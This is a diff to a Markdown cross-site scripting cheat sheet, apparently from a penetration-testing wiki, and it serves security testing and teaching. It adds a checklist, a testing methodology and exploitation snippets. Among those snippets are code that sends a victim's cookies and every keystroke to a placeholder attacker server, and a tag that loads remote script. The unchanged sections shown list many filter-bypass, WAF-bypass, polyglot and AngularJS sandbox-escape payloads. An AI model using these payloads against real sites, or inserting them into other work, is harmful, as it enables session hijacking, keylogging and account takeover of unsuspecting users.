@@ -1,4 +1,64 @@
+---
+description: >-
+  Commonly known as cross-site scripting (XSS), JavaScript injection is where an
+  attacker can inject arbitrary JavaScript to be executed.
+---
+
 # XSS
+
+## JavaScript injection (XSS)
+
+**A simple example**
+
+* A vulnerable webapp allows users to post comments.
+* When a user submits a comment, the website stores it and then displays it on the homepage without any validation or sanitization.
+* An attacker could exploit this by posting `<script>prompt(1)</script>` to the site.
+* When a user visits the homepage, the payload is executed in that users browser.
+
+**Other learning resources:**
+
+* PortSwigger: [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)
+* OWASP: [https://owasp.org/www-project-web-security-testing-guide/v42/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/README](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README)
+
+**Writeups:**
+
+* Bullets
+
+### Checklist
+
+* [ ] Is your input reflected in the response?
+* [ ] Can we inject HTML?
+* [ ] Are there any weaknesses in the Content Security Policy (CSP)?
+* [ ] Can we use events (e.g. onload, onerror)?
+* [ ] Are there any filtered or escaped characters?
+* [ ] Is your input stored and then later rendered?
+* [ ] Can you inject into non-changing values (e.g. usernames)?
+* [ ] Is any input collected from a third party (e.g. account information)?
+* [ ] Is the version of the framework or dependency vulnerable?
+
+### Exploitation
+
+```javascript
+alert(1)
+prompt(1)
+```
+
+```html
+<script src="http://<our-ip>/script.js"></script>
+```
+
+```javascript
+let cookie = document.cookie
+let encodedCookie = encodeURIComponent(cookie)
+fetch("https://<your-web-server>/e?c=" + encodedCookie)
+```
+
+```javascript
+function logKey(event){
+    fetch("http://<your-web-server>/e?c=" + event.key)
+}
+document.addEventListener('keydown', logKey);
+```
 
 ## XSS
 
@@ -76,7 +136,7 @@ echo "domain.com" | waybackurls | gf xss | kxss
 
 #### Basics
 
-```markup
+```shellscript
 # Locators
 '';!--"<XSS>=&{()}
 
@@ -96,7 +156,7 @@ echo "domain.com" | waybackurls | gf xss | kxss
 
 #### By tag
 
-```markup
+```shellscript
 # Tag filter bypass
 <svg/onload=alert(1)>
 <script>alert(1)</script>
@@ -151,7 +211,7 @@ echo "domain.com" | waybackurls | gf xss | kxss
 
 #### Blind
 
-```markup
+```shellscript
 # Blind XSS
 # https://github.com/LewisArdern/bXSS
 # https://github.com/ssl/ezXSS
@@ -175,7 +235,7 @@ echo "domain.com" | waybackurls | gf xss | kxss
 
 #### Bypasses
 
-````markup
+````shellscript
 # No parentheses
 <script>onerror=alert;throw 1</script>
 <script>throw onerror=eval,'=alert\x281\x29'</script>
@@ -217,7 +277,7 @@ echo "domain.com" | waybackurls | gf xss | kxss
 
 #### Encoded
 
-```markup
+```shellscript
 # Unicode
 <script>\u0061lert(1)</script>
 <script>\u{61}lert(1)</script>
@@ -249,7 +309,7 @@ echo "domain.com" | waybackurls | gf xss | kxss
 
 #### Polyglots
 
-````markup
+````shellscript
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 -->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
 oNcliCk=alert(1)%20)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>%5Cx3csVg/<img/src/onerror=alert(2)>%5Cx3e
@@ -353,7 +413,7 @@ copy response in a file.html -> it will work
 
 ### XSS in files
 
-```markup
+```shellscript
 # XSS in filename:
 "><img src=x onerror=alert(document.domain)>.gif
 
@@ -427,7 +487,7 @@ http://acme.corp/?redir=[URI_SCHEME]://gremwell.com%0A%0A[XSS_PAYLOAD]
 
 ### **DOM XSS**
 
-```markup
+```shellscript
 <img src=1 onerror=alert(1)>
 <iframe src=javascript:alert(1)>
 <details open ontoggle=alert(1)>
@@ -442,7 +502,7 @@ javascript:alert(document.cookie)
 
 ### **XSS to CSRF**
 
-```markup
+```shellscript
 # Example:
 
 # Detect action to change email, with anti csrf token, get it and paste this in a comment to change user email:
@@ -463,7 +523,7 @@ function handleResponse() {
 
 ### **AngularJS Sandbox**
 
-```markup
+```shellscript
 # Removed in AngularJS 1.6
 # Is a way to avoid some strings like window, document or __proto__.
 
@@ -490,7 +550,7 @@ toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constr
 
 ### **XSS in JS**
 
-```markup
+```shellscript
 # Inside JS script:
 </script><img src=1 onerror=alert(document.domain)>
 </script><script>alert(1)</script>
@@ -516,7 +576,7 @@ ${alert(1)}
 
 ### XSS Waf Bypasses
 
-```markup
+```shellscript
 # Only lowercase block
 <sCRipT>alert(1)</sCRipT>
 
@@ -580,6 +640,46 @@ ${alert(1)}
 # AngularJS
 {{constructor.constructor(alert 1 )()}} 
 ```
+
+## XSS Methodology
+
+1. **Discovery and Mapping:**
+   * [ ] Enumerate all endpoints, parameters, and user inputs.
+   * [ ] Identify entry points such as query parameters, request bodies, and HTTP headers.
+2. **Generate Test Inputs:**
+   * [ ] Use a unique value for each entry point.
+   * [ ] Inject these values to observe if and how they're reflected or stored.
+3. **Submit and Observe:**
+   * [ ] Submit the test inputs to all identified entry points.
+   * [ ] Monitor both the immediate and subsequent HTTP responses for reflection or persistence of the input data.
+4. **Context Analysis:**
+   * [ ] Analyse where and how the input is reflected or stored in the application.
+   * [ ] Pay attention to the surrounding HTML, JavaScript, or attribute context to craft effective payloads.
+5. **Crafting XSS Payloads:**
+   * [ ] Create payloads suitable for the identified contexts.
+   * [ ] Alternatively use a pre-made list.
+6. **Payload Testing:**
+   * [ ] Fuzz with the crafted payloads.
+   * [ ] For reflected XSS, test if the payload is reflected in the immediate response.
+   * [ ] For stored XSS, check if the payload persists in storage and is executed in subsequent responses.
+   * [ ] For DOM-based XSS, examine the source and trace the flow to any sinks in the DOM, then test payloads that interact with these sinks.
+7. **Browser Execution:**
+   * [ ] Execute the payloads in a browser to verify script execution.
+   * [ ] Use simple JavaScript like `prompt(document.domain)` to test for execution.
+8. **Document Reflections and Payload Execution:**
+   * [ ] Document the precise location and context of each reflected, stored, or DOM-based input.
+   * [ ] Take note of successful payloads and their outcomes.
+9. **Exploit Refinement:**
+   * [ ] If the initial payloads are blocked or sanitized, refine them by using different encodings or obfuscation techniques.
+   * [ ] Consider all possible filter bypass techniques based on the application's behavior.
+10. **Automated Scanning:**
+    * [ ] Use automated scanning tools to identify potential XSS vulnerabilities. However, manual confirmation is necessary, as automated tools can generate false positives and negatives.
+11. **Test for Browser Quirks:**
+    * [ ] Test how different browsers interpret the payloads. Some browsers may encode or decode inputs differently, affecting payload delivery.
+12. **Confirm Persistent Storage (Stored XSS):**
+    * [ ] Verify that the payload is stored and executed across sessions or different user accounts, confirming a stored XSS vulnerability.
+13. **Check for Execution Context (DOM-based XSS):**
+    * [ ] For DOM-based XSS, use browser developer tools to check how the payload is handled by the browser's JavaScript engine.
 
 ### XSS Mindmap
 
